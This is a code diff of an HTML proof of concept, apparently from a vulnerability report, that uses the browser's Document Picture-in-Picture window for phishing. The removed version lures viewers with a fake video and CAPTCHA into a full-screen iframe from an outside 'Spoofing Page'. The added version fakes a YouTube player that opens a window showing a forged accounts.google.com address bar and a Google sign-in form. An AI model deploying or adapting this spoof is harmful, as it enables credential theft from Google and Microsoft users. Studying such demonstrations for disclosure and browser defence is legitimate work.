@@ -1,35 +1,37 @@
+<title>YouTube Player</title>
+<style>
+    #spoofContent { display: none; }
+    .address-bar {
+        background: #202124;
+        color: white;
+        padding: 10px;
+        font-family: monospace;
+        font-size: 14px;
+    }
+</style>
 
-<title>Awesome Video Player</title>
-<style>#content { display: none; } </style>
+<button onclick="openYouTubeSpoof()" style="padding: 15px; font-size: 16px;">
+    🎬 Open YouTube Player
+</button>
 
-<center>
-<br><h2>Watch the <b>Video</b> below <br><br><br><br>
-<img style="cursor: pointer;" src=https://azbigmedia.com/wp-content/uploads/2020/04/vlc-media-player.png width=600 height=300 id="button">
-
-  
-<div id="content" 
-
-style="position: absolute;margin: 5;padding: 5;top: 5;left: 5;width: 100%;height: 100%;font-size: 44px;" 
-
-onclick="document.body.style.overflow='hidden'; window.clickCount=(window.clickCount||0)+1; if(window.clickCount==1){ window.open(`https://login.live.com/login.srf`); }else if(window.clickCount==2){ 
- window.resizeTo(window.screen.width,window.screen.height-180); frm.style.display=`block`; dd.style.display=`none`; }
-
-">
-<iframe id=frm style="position: fixed;display:none;top: 0px;bottom: 0px;right: 0px;width: 100%;border: none;margin: 0;padding: 0;overflow: hidden;z-index: 999999;height: 100%;" src=https://sauceialist.github.io/dia/test3.html>Spoofing Page</iframe>
-
-<div id=dd>You need to login to Microsoft before continuing watching the Video, Complete this Captcha<br><br> <img style=cursor:pointer; width=500 src=https://www.isitwp.com/wp-content/uploads/2021/03/not-a-robot.png>
-
+<div id="spoofContent">
+    <div class="address-bar">https://accounts.google.com</div>
+    <div style="padding: 20px;">
+        <h2>Google Sign In</h2>
+        <p>Sign in to continue to YouTube</p>
+        <input type="email" placeholder="Email or phone" style="width: 100%; padding: 8px; margin: 5px 0;">
+        <button style="width: 100%; padding: 10px; background: #4285f4; color: white; border: none;">Next</button>
+    </div>
 </div>
 
-<script> 
-    var pipOpen = async () => {
-        pipWindow = await documentPictureInPicture.requestWindow({
-            width: 9999,
-            height: 9999
+<script>
+    async function openYouTubeSpoof() {
+        const pipWindow = await documentPictureInPicture.requestWindow({
+            width: 450,
+            height: 350
         });
-
-        pipWindow.document.body.append(content);
-    };
-    button.onclick = pipOpen;
-
+        
+        // Direct content injection - ala Laporan 4
+        pipWindow.document.body.innerHTML = spoofContent.innerHTML;
+    }
 </script>
